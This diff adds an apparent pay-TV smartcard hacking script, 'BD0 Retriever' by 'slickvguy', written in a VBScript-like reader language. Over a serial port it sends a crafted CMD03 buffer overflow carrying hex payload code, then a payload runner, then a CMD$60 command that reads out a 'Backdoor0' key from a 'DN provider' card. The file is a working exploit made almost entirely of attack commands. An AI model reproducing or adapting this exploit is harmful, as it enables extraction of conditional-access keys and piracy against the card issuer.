@@ -1,0 +1,85 @@
+'BD0 Retriever
+'by slickvguy (Also the developer of VCC Analyzer!!!)
+
+'Backdoor0 key retrieval for DN provider via CMD03 overflow
+
+Wx.ResetDelay = 150
+Wx.ByteDelay = 0
+Wx.RxByteTimeout = 50
+Wx.CommPort = "com1:"
+Wx.BaudRate = 115200
+Wx.ResetBaudRate = 9600
+Wx.Parity = 1
+Wx.StopBits = 2
+Wx.DTRControl = 1
+Wx.RTSControl = 0
+Wx.ResetMode = 1
+Wx.ResetLine = 0
+Wx.ByteConvention = 0
+Wx.FlushEchoByte = 1
+Wx.FlushBeforeWrite = 1
+Wx.IgnoreTimeouts = 0
+Wx.ResetAfterTimeout = 0
+Wx.LogTransactions = 0
+Wx.DisplayUSW = 0
+Wx.DisplayFuse = 0
+
+Sub Main ()
+
+sc.verbose = false
+ClearOutputWindow
+
+'Set IFS to A0 bytes (max)
+sc.print "Sending SetIFS..." & vbcr
+sc.write("21C101A041")
+sc.delay(80)
+answer = read_answer()
+sc.print
+
+'Send the Overflow CMD03 to setup SM3 and place the payload code @ EMMBUFF
+sc.print "Sending overflow CMD03..." & vbcr
+sc.write("210054A0CA00004E034C00C5106F15CC00CC00CC00CC000CCD320C5AEA2D2D0CCD320C5AEA2D2D7740772E8DA87F75CBAAB79A07367F2D1E17E67F1E1A14910CCD320C5AEA2D2DB1C445F4E12014808274057184A10A7EC3")
+sc.delay(5000)
+answer = read_answer()
+sc.print
+
+'Send the Payload Runner, which moves BD0 ($C040) 16 bytes to $88~$97 (just below our payload code!), and sets CMD60 flag
+sc.print "Sending payload runner..." & vbcr
+sc.write("21 92 00 B3")
+sc.delay(1000)
+answer = read_answer()
+sc.print
+
+'Send CMD$60 to retrieve the BD0 Key
+sc.print "Sending CMD$60 to retrieve BD0..." & vbcr
+sc.write("214008A0CA00000260004223")
+sc.delay(200)
+answer = read_answer()
+sc.print
+sc.print "BD0: " & mid(answer,40,48)
+
+
+End sub
+
+
+'==========================================================================================================================
+function read_answer()
+length = sc.bytesinbuffer
+sc.read(length)
+sc.print "Rx: "
+if length = 0 then
+    answer=""
+    sc.print("(No answer)")
+else
+    For X = 0 to length - 1
+        ThisByte = Hex(Sc.GetByte(X))
+        if Len(ThisByte) = 1 then ThisByte = "0" & ThisByte
+        Thisbyte = Thisbyte & " "
+        read_answer = read_answer & Thisbyte
+        Sc.Print(ThisByte)
+    Next
+end if
+Sc.Print
+
+end function
+'==========================================================================================================================
